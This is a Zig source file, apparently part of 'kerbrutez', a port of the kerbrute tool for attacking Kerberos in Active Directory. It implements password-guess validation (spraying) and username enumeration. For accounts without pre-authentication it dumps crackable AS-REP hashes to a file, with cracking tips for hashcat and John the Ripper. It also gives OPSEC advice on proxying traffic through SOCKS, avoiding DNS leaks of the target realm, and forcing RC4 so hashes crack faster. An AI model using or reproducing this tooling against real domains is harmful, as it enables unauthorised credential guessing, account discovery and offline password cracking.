//! KerbruteSession — wires the krb5 client to kerbrute's per-attempt logic:
//! testLogin (password validation) and testUsername (enumeration + AS-REP
//! roast). Mirrors kerbrute's session/session.go.

const std = @import("std");
const Allocator = std.mem.Allocator;
const Io = std.Io;
const krb5 = @import("krb5");
const Logger = @import("../util/log.zig").Logger;
const hashutil = @import("../util/hash.zig");
const secret_file = @import("../util/secret_file.zig");
const errmap = @import("errors.zig");
const Outcome = errmap.Outcome;
const report_mod = @import("../report/report.zig");
const SpinLock = @import("../util/spinlock.zig").SpinLock;

pub const Options = struct {
    domain: []const u8,
    domain_controller: ?[]const u8 = null,
    verbose: bool = false,
    safe: bool = false,
    /// AS-REQ enctype preference (default `.all` = noise level 3; `.rc4` downgrades).
    etype: krb5.config.EtypePref = .all,
    /// On userenum, dump the `$krb5asrep$` hash for no-pre-auth accounts.
    asrep_dump: bool = false,
    /// Optional SOCKS5 proxy "host:port" for KDC traffic (OPSEC).
    socks: ?[]const u8 = null,
    /// Optional DNS server for SRV KDC discovery (overrides resolv.conf).
    dns_server: ?[]const u8 = null,
    hash_filename: ?[]const u8 = null,
};

pub const Error = error{ DomainRequired, NoKDCsFound, InvalidDcPort } || Allocator.Error;

pub const Session = struct {
    allocator: Allocator,
    io: Io,
    logger: *Logger,
    config: krb5.config.Config,
    /// Original-case domain (for "user@domain" log strings).
    domain: []const u8,
    safe: bool,
    asrep_dump: bool = false,
    /// Reporting aggregator (M10), set by the CLI after init. BORROW.
    report: ?*report_mod.Report = null,
    hash_file: ?Io.File = null,
    hash_file_pos: u64 = 0,
    hash_lock: SpinLock = .{},

    /// Build a session. Logs the resolved KDC(s); errors if none are found.
    /// OWNERSHIP: call `deinit`.
    pub fn init(allocator: Allocator, io: Io, logger: *Logger, opts: Options) Error!Session {
        if (opts.domain.len == 0) return Error.DomainRequired;

        var config = krb5.config.Config.init(allocator, opts.domain, opts.domain_controller, opts.etype) catch |e| switch (e) {
            error.OutOfMemory => return Error.OutOfMemory,
            // An explicit but unusable port must stop the run, not be swapped
            // for 88 behind the operator's back (see withDefaultPort).
            error.InvalidPort => {
                logger.err("--dc has an invalid port (must be 1-65535). Refusing to fall back to the default port and contact a host you didn't specify.", .{});
                return Error.InvalidDcPort;
            },
        };
        errdefer config.deinit();
        config.socks = opts.socks;
        config.dns_server = opts.dns_server;

        const domain = try allocator.dupe(u8, opts.domain);
        errdefer allocator.free(domain);

        var self = Session{
            .allocator = allocator,
            .io = io,
            .logger = logger,
            .config = config,
            .domain = domain,
            .safe = opts.safe,
            .asrep_dump = opts.asrep_dump,
        };

        switch (opts.etype) {
            .rc4 => logger.info("Encryption: arcfour-hmac-md5 (RC4) — deprecated, may be rejected by modern AD", .{}),
            .aes => logger.info("Encryption: AES only (aes256/aes128) — stealthier/modern, but hashes are slow to crack", .{}),
            .all => logger.info("Encryption: all types (aes256, aes128, des3, rc4) — default, maximum compatibility (noise level 3)", .{}),
        }

        // Resolve and log KDCs (matches kerbrute's setup output).
        const kdcs = self.config.getKDCs(io, false) catch {
            logger.err("Couldn't find any KDCs for realm {s}. Please specify a Domain Controller", .{self.config.realm});
            return Error.NoKDCsFound;
        };
        defer self.config.freeKDCs(kdcs);
        if (kdcs.len == 0) {
            logger.err("Couldn't find any KDCs for realm {s}. Please specify a Domain Controller", .{self.config.realm});
            return Error.NoKDCsFound;
        }
        // OPSEC: SOCKS covers the KDC traffic (sendTCP routes it through the
        // proxy and hands the target to the proxy by NAME), but SRV/A discovery
        // runs over UDP straight from this host. With --socks and no --dc, the
        // realm being targeted leaks to the local resolver from the operator's
        // real address — which defeats the point of proxying.
        if (self.config.socks != null and self.config.dns_lookup_kdc) {
            logger.warning("[!] --socks does NOT cover DNS: the SRV lookup for '{s}' went out from this host, not through the proxy. Pass --dc <ip> (or --dns a resolver reached through the proxy) to avoid revealing the target realm.", .{self.config.realm});
        }
        // One-time SOCKS handshake so a proxy problem is diagnosed here, by name,
        // instead of looking like an unreachable KDC on every single attempt.
        if (self.config.socks) |proxy| {
            const first = kdcs[0];
            const colon = std.mem.lastIndexOfScalar(u8, first, ':');
            const phost = if (colon) |c| first[0..c] else first;
            const pport: u16 = if (colon) |c| (std.fmt.parseInt(u16, first[c + 1 ..], 10) catch 88) else 88;
            if (krb5.network.preflightSocks(io, allocator, self.config, phost, pport)) |_| {
                logger.info("SOCKS5 proxy {s}: handshake OK (KDC traffic is proxied; the target is resolved proxy-side)", .{proxy});
            } else |e| switch (e) {
                error.SocksAuthUnsupported => logger.warning("[!] SOCKS5 proxy {s} requires authentication, which kerbrutez does not implement (it offers no-auth only). Every attempt will fail as a network error until you use a proxy that allows no-auth.", .{proxy}),
                error.SocksConnectFailed => logger.warning("[!] SOCKS5 proxy {s} is unreachable (not the KDC — the PROXY). Check --socks host:port.", .{proxy}),
                error.SocksConnectRejected => logger.warning("[!] SOCKS5 proxy {s} refused to connect to {s}:{d} — the proxy reached its policy or the target is unreachable from it.", .{ proxy, phost, pport }),
                else => logger.warning("[!] SOCKS5 proxy {s}: handshake failed ({t}).", .{ proxy, e }),
            }
        }
        logger.info("Using KDC(s):", .{});
        for (kdcs) |kdc| logger.info("\t{s}", .{kdc});

        // Open the hash output file (append) if requested.
        if (opts.hash_filename) |path| {
            // Crackable AS-REP hashes — owner-only, like every other secret
            // output (util/secret_file.zig).
            const f = secret_file.create(io, path, .{ .truncate = false }) catch {
                logger.err("Could not open hash file {s}", .{path});
                return Error.NoKDCsFound;
            };
            self.hash_file = f;
            self.hash_file_pos = if (f.stat(io)) |st| st.size else |_| 0;
            logger.info("Saving any captured hashes to {s}", .{path});
            if (opts.etype != .rc4) {
                logger.warning("You are capturing AS-REPs with AES. To crack them faster with a password, re-run with --etype rc4 (arcfour-hmac-md5)", .{});
            }
        }
        return self;
    }

    pub fn deinit(self: *Session) void {
        if (self.hash_file) |f| f.close(self.io);
        self.hash_file = null;
        self.allocator.free(self.domain);
        self.config.deinit();
    }

    /// Validate username/password. Returns the interpreted outcome.
    pub fn testLogin(self: *Session, username: []const u8, password: []const u8) Outcome {
        var client = krb5.client.Client.init(self.allocator, self.io, &self.config);
        var guesses: u8 = 0;
        const res = client.loginCounted(username, password, &guesses);
        var outcome: Outcome = switch (res) {
            .valid => .{ .valid = true, .abort = false, .reason = "", .result = .valid },
            .decrypt_error => .{ .valid = false, .abort = false, .reason = "Got AS-REP (no pre-auth) but couldn't decrypt - bad password", .result = .decrypt_error },
            .network_error => .{ .valid = false, .abort = true, .reason = "NETWORK ERROR - Can't talk to KDC. Aborting...", .result = .network_error },
            .krb_error => |e| errmap.mapLoginError(e.code, self.safe, e.nt_status),
        };
        // Report what actually went on the wire so the lockout budget can be
        // charged honestly (see Outcome.password_guesses).
        outcome.password_guesses = guesses;
        return outcome;
    }

    /// Enumerate a username. Dumps an AS-REP-roast hash if captured.
    pub fn testUsername(self: *Session, username: []const u8) Outcome {
        var client = krb5.client.Client.init(self.allocator, self.io, &self.config);
        const res = client.testUsername(username);
        switch (res) {
            .exists_no_preauth => |roast| {
                defer roast.deinit();
                if (self.asrep_dump) {
                    self.dumpAsRepHash(roast);
                } else {
                    self.logger.notice("[+] {s} has no pre-auth required (AS-REP-roastable). Re-run this userenum with the --asrep flag to dump the crackable $krb5asrep$ hash.", .{roast.cname});
                }
                return .{ .valid = true, .abort = false, .reason = "", .result = .valid };
            },
            .network_error => return .{ .valid = false, .abort = true, .reason = "NETWORK ERROR - Can't talk to KDC. Aborting...", .result = .network_error },
            .krb_error => |info| {
                // Flag accounts that are valid but not classically sprayable.
                if (info.code == krb5.iana.error_code.kdc_err_preauth_required) {
                    if (info.mech.pkinitRequired()) {
                        self.logger.notice("[+] {s}@{s} — PKINIT/certificate pre-auth required (valid, but NOT password-sprayable)", .{ username, self.domain });
                    } else if (info.mech.fastEnforced()) {
                        self.logger.notice("[+] {s}@{s} — realm enforces FAST armoring (valid; spraying needs an armor ticket)", .{ username, self.domain });
                    } else if (info.mech.fast) {
                        self.logger.debug("[~] {s}@{s} — KDC advertises FAST (armoring available; classic pre-auth still works)", .{ username, self.domain });
                    }
                }
                return errmap.mapUsernameError(info.code, self.safe, info.nt_status);
            },
        }
    }

    /// Format and report an AS-REP-roast hash; append to the hash file if set.
    fn dumpAsRepHash(self: *Session, roast: krb5.client.AsRepRoast) void {
        const hash = hashutil.asRepToHashcat(self.allocator, roast.etype, roast.cname, roast.crealm, roast.cipher) catch {
            self.logger.debug("[!] Got encrypted TGT for {s}, but couldn't convert to hash", .{roast.cname});
            return;
        };
        defer self.allocator.free(hash);
        if (self.report) |r| r.addAsrepRoast(roast.cname, hash, hashutil.asRepHashcatMode(roast.etype));
        if (hashutil.asRepHashcatMode(roast.etype)) |mode| {
            self.logger.notice("[+] {s} has no pre auth required. AS-REP hash (hashcat -m {d}):\n{s}", .{ roast.cname, mode, hash });
        } else {
            // No hashcat mode exists for this etype (AES AS-REPs). Say what to
            // do instead rather than leaving the operator to guess a -m that
            // either refuses to load or silently cracks with the wrong cipher.
            self.logger.notice("[+] {s} has no pre auth required. AS-REP hash (etype {d}):\n{s}", .{ roast.cname, roast.etype, hash });
            self.logger.warning("[!] hashcat has NO mode that cracks an AES AS-REP (19600/19700 are TGS-REP modes and will refuse this hash; 18200 loads it but cracks as RC4 and will never succeed). Use John the Ripper's krb5asrep format, or re-run with --etype rc4 to request a crackable RC4 AS-REP.", .{});
        }

        if (self.hash_file) |f| {
            self.hash_lock.lock();
            defer self.hash_lock.unlock();
            var buf: [4096]u8 = undefined;
            var w = f.writer(self.io, &buf);
            // Write at the file's current end: another concurrent run may share
            // this hash file, and a cached offset would overwrite whatever it
            // captured (same defect as state/store.zig append).
            const end: u64 = if (f.stat(self.io)) |st| @max(st.size, self.hash_file_pos) else |_| self.hash_file_pos;
            w.pos = end;
            w.interface.print("{s}\n", .{hash}) catch {
                // Same silent-loss risk as the kerberoast writer: say so rather
                // than dropping a captured hash on the floor.
                self.logger.err("[!] captured an AS-REP hash for {s} but could NOT write it to the hash file — it is only in the console output above.", .{roast.cname});
                return;
            };
            w.interface.flush() catch return;
            self.hash_file_pos = end + hash.len + 1;
        }
    }
};
